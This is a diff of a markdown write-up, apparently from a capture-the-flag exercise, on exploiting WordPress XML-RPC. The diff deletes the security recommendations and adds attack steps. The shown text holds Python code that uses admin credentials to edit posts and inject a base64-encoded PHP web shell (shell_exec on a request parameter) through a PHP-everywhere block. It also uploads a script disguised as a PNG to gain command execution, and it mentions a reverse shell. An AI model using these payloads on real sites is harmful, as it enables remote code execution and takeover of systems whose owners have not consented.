@@ -19,22 +19,15 @@ Despite its utilities, leaving XML-RPC enabled brings several security concerns:
 - **DDoS Amplification:** XML-RPC can be abused in denial of service (DDoS) attacks, where an attacker uses the system.multicall method to execute multiple actions in a single request, amplifying the impact on the target server.
 - **Exploitation of Vulnerabilities:** The interface can be exploited to use specific vulnerabilities, such as the injection of malicious commands that can be executed on the server, if WordPress and its plugins are not properly updated and configured.
 
-## Exploitation of Vulnerability Through XML-RPC
+# Exploring Vulnerability through XML-RPC
 
-As seen in the example detailed previously, XML-RPC can be a vector for significant attacks. In the described case, the hacker exploited the functionality of XML-RPC to execute remote commands through manipulated calls. After verifying that XML-RPC was enabled and accessible, the attacker used methods such as wp.getPosts and wp.newPost, and eventually exploited specific vulnerabilities through malicious scripts inserted in posts.
+As illustrated in a hypothetical scenario, XML-RPC can be a vector for significant attacks. In the scenario outlined, a hacker exploits the functionality of XML-RPC to execute remote commands through manipulated calls. After confirming that XML-RPC was enabled and accessible, the attacker uses methods such as `wp.getPosts` and `wp.newPost`, inserting malicious scripts into the posts to exploit specific vulnerabilities.
 
-One of the most critical methods exploited was htb.get_flag, apparently a custom function that returned a security flag, a typical component in hacking competitions. This exploitation was facilitated by the lack of appropriate restrictions on the use of XML-RPC, demonstrating how powerful functions can be abused if not properly protected.
+One of the potentially exploitable methods could be one that allows deeper interactions with the system, such as retrieving critical information or executing specific commands. These commands, by nature, should be restricted. This possible exploitation underscores the importance of implementing stringent controls on the methods accessible via XML-RPC, ensuring that only safe and authorized functions are available to external users. The lack of such restrictions can lead to the abuse of powerful functionalities, compromising the system's security.
 
-## Security Recommendations
+## Manipulating the Post System
 
-To mitigate the risks associated with XML-RPC in WordPress, it is recommended:
-
-- **Disable XML-RPC when not in use.** This can be done through specific plugins or by modifying the .htaccess file to block access to xmlrpc.php.
-- **Limit access to xmlrpc.php** using firewall rules or web server settings to allow only trusted IPs.
-- **Monitor and audit the use of XML-RPC** to detect and respond to suspicious activities quickly.
-- **Keep WordPress and plugins updated,** ensuring that the latest security measures and vulnerability fixes are applied.
-
-In summary, while XML-RPC offers practical functionalities for integration with other systems and devices, it is crucial to be aware of the associated security risks and take necessary measures to protect your WordPress site from potential abuses of this powerful API.
+In the following exploration, we will manipulate the posting system. By using the XML-RPC interface, attackers can alter, create, or delete blog posts without proper authorization. This manipulation not only allows the insertion of malicious content, but also the potential to control the narrative or interrupt services, or even worse, have complete control of the system as you will see below.
 
 # Exploitation:
 If you have administrator access on a WordPress site, even with a two-factor authentication (2FA) plugin, it is possible to exploit XML-RPC to execute arbitrary commands, including obtaining shell privileges. Using the Python WordPress XML-RPC library, as documented at [https://python-wordpress-xmlrpc.readthedocs.io/en/latest/overview.html](https://python-wordpress-xmlrpc.readthedocs.io/en/latest/overview.html), you can manipulate posts and potentially insert malicious PHP code.
@@ -51,21 +44,24 @@ client = Client("http://host_ip_address/xmlrpc.php", 'admin', 'password')
 
 # Fetching posts
 post = client.call(posts.GetPosts())
-post_details = post[0]
-print(post_details.content)  # Outputs the content of the first post
+post[0]
+'<WordPressPost: b"Post Title">'
+post[0].content
 ```
 
-The original post content included a base64 encoded PHP info script (`<?php phpinfo(); ?>`). This base64 string ("PD9waHAgcGhwaW5mbygpOyA/Pg==") could be replaced with a malicious command like:
-
-```base64
-PD9waHAKCWVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkgLiAiPC9wcmU+IjsKPz4K
+Result:
+```python
+'<!-- wp:paragraph -->\n<p>Post content</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"PD9waHAgcGhwaW5mbygpOyA/Pg==,"version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
 ```
+
+The original post content include a base64 encoded PHP info script (`<?php phpinfo(); ?>`).  
+This base64 string (`"PD9waHAgcGhwaW5mbygpOyA/Pg=="`) could be replaced with a malicious command like: `PD9waHAKCWVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkgLiAiPC9wcmU+IjsKPz4K`
 
 Which decodes to:
 
 ```php
 <?php
-echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 ?>
 ```
 
@@ -76,6 +72,19 @@ Suppose the system allows code injection. We could inject malicious PHP code thr
 post[0].content = '<!-- wp:paragraph --><p>[Malicious code here]</p><!-- /wp:paragraph -->'
 client.call(posts.EditPost(post[0].id, post))
 ```
+
+### Time to poisoning: 
+```python
+post[0]
+malicious_post = post[0]
+malicious_post.content
+malicious_post.content =  '<!-- wp:paragraph -->\n<p>Post content</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"PD9waHAKCWVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkgLiAiPC9wcmU+IjsKPz4K,"version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
+client.call(posts.EditPost(malicious_post.content.id, malicious_post))
+```
+
+
+
+We must receive a `True` response.
 
 To create a reverse shell in bash, you can use the following script:
 
@@ -119,8 +128,8 @@ print(response)
 The result of our file upload using XML-RPC was successful, demonstrating the ability to bypass security filters. The file upload result was:
 
 ```python
->>> client.call(media.UploadFile(fileToUpload))
-{'attachment_id': '52', 'date_created_gmt': <DateTime '20240425T10:26:49' at 0x7fbc59f43710>, 'parent': 0, 'link': '/wp-content/uploads/2022/04/a.png', 'title': 'a.png', 'caption': '', 'description': '', 'metadata': False, 'type': 'text/plain', 'thumbnail': '/wp-content/uploads/2022/04/a.png', 'id': '52', 'file': 'a.png', 'url': '/wp-content/uploads/2022/04/a.png'}
+client.call(media.UploadFile(fileToUpload))
+"{'attachment_id': '52', 'date_created_gmt': <DateTime '20240425T10:26:49' at 0x7fbc59f43710>, 'parent': 0, 'link': '/wp-content/uploads/2022/04/a.png', 'title': 'a.png', 'caption': '', 'description': '', 'metadata': False, 'type': 'text/plain', 'thumbnail': '/wp-content/uploads/2022/04/a.png', 'id': '52', 'file': 'a.png', 'url': '/wp-content/uploads/2022/04/a.png'}"
 ```
 
 Afterward, running the script as a privileged user could be possible, accessing the file as if it were an image but actually executing it as a bash script. This demonstrates an effective way to circumvent security measures and exploit system privileges.
